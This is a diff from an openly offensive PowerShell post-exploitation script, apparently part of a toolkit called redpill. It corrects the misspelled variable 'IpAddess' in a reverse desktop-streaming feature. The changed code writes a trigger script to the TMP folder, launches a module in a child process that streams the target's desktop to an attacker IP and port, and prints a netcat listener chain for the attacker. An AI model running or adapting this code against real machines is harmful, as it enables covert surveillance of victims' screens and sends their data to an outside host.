@@ -2786,7 +2786,7 @@ If($LiveStream -ne "false"){
    .PARAMETER LiveStream
       Accepts arguments: Bind, Reverse, Stop (default: Bind)
 
-   .Parameter IPAddress
+   .Parameter IpAddress
       The IP address to connect to when using the -Reverse switch.
 
    .PARAMETER Port
@@ -2934,9 +2934,9 @@ If($LiveStream -ne "false"){
    {
 
       ## Make sure requirements are sastified!
-      If($IpAddess -ieq "False")
+      If($IpAddress -ieq "False")
       {
-         Write-Host "[error] This function requires attacker -IpAddess 'ipaddress'!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "[error] This function requires attacker -IpAddress 'ipaddress'!" -ForegroundColor Red -BackgroundColor Black
          Write-Host "";Start-Sleep -Seconds 1
          exit ## Exit @redpill
       }
@@ -2963,7 +2963,7 @@ If($LiveStream -ne "false"){
       Write-Host "`nStream desktop settings" -ForegroundColor Green
       Write-Host "--------------------------"
       Write-Host "Target      : $Address"
-      Write-Host "Attacker    : $IpAddess"
+      Write-Host "Attacker    : $IpAddress"
       Write-Host "Stream      : Reverse"
       Write-Host "ReversePort : $Port"
       If($Timmer -eq 0)
@@ -2980,7 +2980,7 @@ If($LiveStream -ne "false"){
       ## Create trigger script to import\run module on a diferent process! (child)
       Write-Host "Creating trigger.ps1 to import \ run module on a diferent process! (child)"
       echo "Import-Module -Name `"$Env:TMP\Stream-TargetDesktop.ps1`" -EA SilentlyContinue -Force"|Out-File -FilePath "$Env:TMP\trigger.ps1" -Encoding ascii -Force
-      Add-Content $Env:TMP\trigger.ps1 "TargetScreen -Reverse -IPAddress $IpAddess -Port $Port"
+      Add-Content $Env:TMP\trigger.ps1 "TargetScreen -Reverse -IPAddress $IpAddress -Port $Port"
 
       ## Run remote module in a new powershell process
       Write-Host "Executing Start-Process to run module in a new powershell process! (child)"
@@ -2990,7 +2990,7 @@ If($LiveStream -ne "false"){
       ## Start firefox to access streaming!
       Write-Host "-----------------------------------------------------------------------------"
       Write-Host "Execute on attacker console: nc -nlvp ${Port} | nc -nlvp 9000" -ForegroundColor Green
-      Write-Host "Start firefox on attacker side on: http://${IpAddess}:9000 to access stream!" -ForegroundColor Green
+      Write-Host "Start firefox on attacker side on: http://${IpAddress}:9000 to access stream!" -ForegroundColor Green
       Write-Host "-----------------------------------------------------------------------------";Start-Sleep -Milliseconds 500
       If($Timmer -eq 0)
       {
